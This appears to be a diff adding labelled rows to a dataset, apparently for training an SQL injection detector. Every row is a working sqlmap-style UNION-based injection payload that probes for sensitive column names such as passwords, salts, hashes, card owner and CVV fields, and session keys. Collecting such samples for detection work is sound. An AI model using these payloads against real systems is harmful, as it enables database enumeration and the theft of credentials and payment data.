+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT adminlogin FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wnUn",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT admins FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- sPLJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT aim FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XpuB",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT auth FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mSkm",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT authenticate FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dBge",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT authentication FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KtEk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT blog FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UjPg",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cc_expires FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QVej",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cc_owner FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BDoT",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cc_type FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YkwU",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cfg FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EjLt",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT clientname FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zmTg",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT clientusername FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- faSd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT clientpassword FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RfIy",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT config FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- sUkU",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT contact FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WdIC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT converge_pass_hash FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GDos",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT converge_pass_salt FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nWgh",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT crack FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pMYW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT customers FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GTEH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `cvvnumber]` FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KggO",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT db_database_name FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WMSV",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT db_hostname FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VqpU",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT db_password FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TTGU",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT db_username FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vlDV",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `e-mail` FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bEZq",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT download FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yDPd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT emailaddress FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rOAU",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `full` FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RsvX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `group` FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BrGQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT hash FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IMHv",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT hashsalt FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IGDt",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT homepage FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- juBd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT icq FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LluC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT icq_number FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JwxJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT id_member FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zaSc",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT images FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zHmd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT index FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HLLy",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ip_address FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oOyI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT last_ip FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JzTU",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT last_login FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gQQs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT login_name FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QhAc",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT login_pw FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FEid",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT loginkey FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TvSf",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT loginout FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kUpw",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT logo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WjAr",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT md5hash FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NpRd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT member FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gcYc",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT member_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IIhC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT member_login_key FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- sLXh",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT member_name FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BrqS",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT memberid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OUXW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT membername FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JNLx",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT members FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dDTX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT new FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bQGd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT news FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fCzu",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nick FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OXIB",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT number FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bdid",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nummer FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- iTni",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pass_hash FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- daeZ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT passwordsalt FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oMKE",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT personal_key FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- opsZ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT phone FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XXWH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT privacy FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- sTqq",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pw FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NSXJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pwrd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LGuO",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT salt FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CJRY",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT search FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uHhJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT secretanswer FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aaAJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT secretquestion FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uSwn",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT serial FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- umHp",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT session_member_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rRMZ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT session_member_login_key FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Ttyf",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sesskey FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- lfpJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT spacer FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FYgm",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT status FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dTZc",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT store FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CLWi",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT store1 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QuTb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT store2 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- iIFS",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT store3 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fiFm",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT store4 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zldr",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT table_prefix FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- AOQm",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT temp_pass FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rTPE",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT temp_password FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NgYx",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT temppass FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cHoR",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT temppasword FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xgiN",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT un FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nwuN",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_email FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- etwq",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_icq FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fqXD",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_ip FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GSvn",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_level FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- khmf",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_passw FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BIxh",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_pw FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UHcp",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_pword FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DuuB",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_pwrd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uzrb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_un FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zZvM",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_uname FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oHgt",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_usernm FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gUji",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_usernun FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KUla",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_usrnm FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xRRB",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT userip FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XEet",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT userlogin FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YoHW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT usernm FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hRwp",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT userpw FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- brRg",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT usrnm FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GEBa",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT usrs FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UChf",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT warez FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zKzY",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xar_name FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tJqj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xar_pass FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IDGR",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT logout FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xmQC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_usern FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bOjl",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_nm FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TxHA",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT fld_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Pwod",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT fld_username FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cqce",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT fld_password FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hEIz",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT loginname FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TlHv",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pasword FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Nsvu",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT permission FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jWRq",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT perm FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qaSW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tendn FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xBny",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tendangnhap FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XOnM",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tenquantri FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mDlS",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tenquanly FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fadc",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tennguoidung FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YJnn",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ten FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uIrT",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tennd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DizR",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nguoidung FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TYDC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nguoidungid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uqsg",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT quantri FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DZYS",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT quanly FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cILI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT u_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QQjt",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT accountname FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nRWh",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT account_name FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XaZo",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT matkhau FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JxDX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT matma FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Ohyr",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT paswd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Tlla",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pas FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Lpmr",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tukhoa FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zOaZ",1
